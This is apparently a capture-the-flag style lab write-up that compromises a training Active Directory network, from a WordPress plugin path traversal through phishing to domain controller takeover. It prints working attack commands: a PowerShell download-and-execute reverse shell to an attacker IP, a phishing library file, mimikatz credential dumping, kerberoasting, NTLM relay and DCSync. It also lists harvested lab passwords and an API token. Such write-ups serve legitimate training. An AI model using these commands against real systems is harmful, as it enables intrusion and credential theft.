# Beyond

## Network

**Given:**

- 192.168.115.244 / WEBSRV1
- 192.168.115.242 / MAILSRV1

**Found:**

- 172.16.71.243 / CLIENTWK1
- 172.16.71.240 / DCSRVR1
- 172.16.71.241 / INTERNALSRV1

## Creds

```
daniela:tequieromucho (SSH private key passphrase)
daniela:DANIelaRO123 (domain password)
wordpress:DanielKeyboard3311 (WordPress database connection settings)
john:dqsTwTpZPn#nL (show commit in WEBSRV1)
marcus:DefrostNewsySupply5544 (in script in CLIENTWK1)
beccy:f0397ec5af49971f6efbdb07877046b3 (cached hash in mailserver)
```

## 192.168.115.244 WEBSRV1

### Enum

![](assets/Pasted%20image%2020250211120029.png)

Port 80 has a web server. Upon inspecting it, there is not much to do.

![](assets/Pasted%20image%2020250211124041.png)

Wappalyzer shows that this is a WordPress site.

![](assets/Pasted%20image%2020250211124153.png)

Using an aggressive scan, we see that there are vulnerable plugins. We can use Duplicator.

```bash
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://192.168.115.244 -e p --api-token 8sqjmTO996bA7SfqC2aPWyT6QWNXYUTsAbPhO0THu7c --plugins-detection aggressive
```

![](assets/Pasted%20image%2020250211125015.png)

### Initial Access

Following the link, there is the POC.

![](assets/Pasted%20image%2020250211125032.png)

We can retrieve `/etc/passwd` to see the users, so:

```bash
$ curl 'http://192.168.115.244/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../etc/passwd' -o passwd
```

![](assets/Pasted%20image%2020250211125637.png)

We have two users, `daniela` and `marcus`. Since port 80 is open, maybe these users have some SSH key with the default name `id_rsa`.

![](assets/Pasted%20image%2020250211125843.png)

Try to log in with this key.

![](assets/Pasted%20image%2020250211125958.png)

It is protected, so crack it with `ssh2john` and `john`.

![](assets/Pasted%20image%2020250211130234.png)

Now we have the passphrase:

![](assets/Pasted%20image%2020250211130401.png)

### Privesc

The first thing to notice is that `daniela` can use Git as a superuser.

![](assets/Pasted%20image%2020250211130608.png)

From GTFOBins:

![](assets/Pasted%20image%2020250211130628.png)

![](assets/Pasted%20image%2020250211130654.png)

### Post Exploitation

We need to look for sensitive information to access another host.

Transfer `linpeas` by creating a Python server and retrieving it with `wget` from the machine.

![](assets/Pasted%20image%2020250211131342.png)

![](assets/Pasted%20image%2020250211131355.png)

Go to the WordPress project and use Git to show old commits with `git log`.

![](assets/Pasted%20image%2020250211132444.png)

Then show the changes with `git show <commit>`, and we get credentials.

![](assets/Pasted%20image%2020250211132559.png)

So we have `john:dqsTwTpZPn#nL` and another server: `192.168.50.245`.

We can also inspect the `wp-config.php` file to get credentials for the database.

![](assets/Pasted%20image%2020250211132909.png)

## 192.168.115.242 MAILSRV1

### Enum

![](assets/Pasted%20image%2020250211120115.png)

Enumerating this machine, we found that there is no vulnerable service. We tried to check known credentials with CME.

![](assets/Pasted%20image%2020250211133756.png)

So `john` has valid credentials, and SMB signing is disabled. At this point, we can only submit a phishing email using the mail server.

### Initial Access

After a relay attack from `internalserver1`, we are inside with internal access as `authority/system`.

### Post Exploitation

Transfer `mimikatz` to the host and retrieve secrets.

```bash
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

We got `beccy`'s hash.

We can use PTH to move to the DC using `psexec`, for example.

## 172.16.71.243 / CLIENTWK1

### Initial Access

After enumerating the mail server, we will perform a phishing attack. We need a Windows library and a shortcut, a WebDAV server serving the shortcut, an HTTP server serving `powercat.ps1`, and a listener to receive the reverse shell. Then we'll send an email with the library as an attachment.

In Windows, prepare the library and the shortcut. The library will look like this, pointing to our attack machine:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>8</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <propertyStore>
    <property name="ShowNonIndexedLocationsInfoBar" type="boolean"><![CDATA[false]]></property>
  </propertyStore>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
              <url>http://192.168.45.229</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

The shortcut will target our attack machine and listener port:

```bash
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.229:3333/powercat.ps1'); powercat -c 192.168.45.229 -p 4444 -e powershell"
```

Create a Python HTTP server on port 3333, a listener with `nc` on port 4444, and a WebDAV server on port 80. We send the email with `sendEmail`.

![](assets/Pasted%20image%2020250211153428.png)

```bash
sendEmail -t marcus@beyond.com,daniela@beyond.com -u open -m yes -a install/config.Library-ms -s 192.168.115.242 -f john@beyond.com -xu john -xp 'dqsTwTpZPn#nL'
```

And we got a reverse shell.

![](assets/Pasted%20image%2020250211152824.png)

We transfer `winpeas` and `adpeas` for recon on the system.

```bash
python -m http.server 3333
```

From Windows:

```bash
iwr -uri http://192.168.45.229:3333/winPEAS.exe -outfile winpeas.exe
iwr -uri http://192.168.45.229:3333/adPEAS.exe -outfile adpeas.exe
```

We found a scheduled script:

![](assets/Pasted%20image%2020250211160704.png)

This is the script that acts as a user clicking in our phishing, and there are `marcus` credentials.

![](assets/Pasted%20image%2020250211163604.png)

And info about the domain:

![](assets/Pasted%20image%2020250211160736.png)

So user `beccy` can perform a DCSync and get credentials, and `daniela` is kerberoastable.

![](assets/Pasted%20image%2020250211161028.png)

First, using `chisel`, we create a SOCKS tunnel to enumerate the internal network.

Serve `chisel` with a Python server and retrieve it with `iwr`.

![](assets/Pasted%20image%2020250211164323.png)

Now we make a ping sweep to find other machines, and we got `INTERNALSRV1` on `172.16.71.241`.

```bash
for i in $(seq 1 254); do proxychains nc -zv -w 1 172.16.71.$i 445; done
```

Checking with CME:

![](assets/Pasted%20image%2020250211170034.png)

`daniela` is kerberoastable, so we perform the attack.

![](assets/Pasted%20image%2020250211174016.png)

And using `hashcat`:

```bash
hashcat -m 13100 hash /rockyou.txt --force
```

![](assets/Pasted%20image%2020250211174157.png)

So we have `daniela:DANIelaRO123`.

## 172.16.71.241 / INTERNALSRV1

### Enum

![](assets/Pasted%20image%2020250211172749.png)

Let's see the web server.

```bash
proxychains firefox 172.16.71.241
```

The page doesn't load fully, and we see in the code that there are URLs pointing to `internalsrv1.beyond.com`, so we add it to `/etc/hosts`.

![](assets/Pasted%20image%2020250211173118.png)

Now the page loads perfectly. It is a WordPress site, so we go to `wp-admin`.

![](assets/Pasted%20image%2020250211173318.png)

We try all credentials we have, and `daniela` with `DANIelaRO123` works.

There is a plugin that we can change to make backups and point to our attack box. Then we can get the NTLM hash. So let's run an SMB server and save the backup options.

![](assets/Pasted%20image%2020250211174933.png)

```bash
$ impacket-smbserver -smb2support kali .
```

We receive the connection from `internalsrv1`.

![](assets/Pasted%20image%2020250211175023.png)

The hash is NTLMv2, and SMB signing is disabled, so we can try an NTLM relay attack to pass the request to the mail server.

![](assets/Pasted%20image%2020250211175724.png)

Start an `nc` listener on port 5555 and push the backup.

![](assets/Pasted%20image%2020250211175821.png)

## 172.16.71.240 / DCSRVR1

### Initial Access

With `beccy`'s hash, we use PTH to access the DC.

![](assets/Pasted%20image%2020250211180744.png)

To finish, we can get the Administrator hash by performing a DCSync attack using `secretsdump`.

![](assets/Pasted%20image%2020250211182626.png)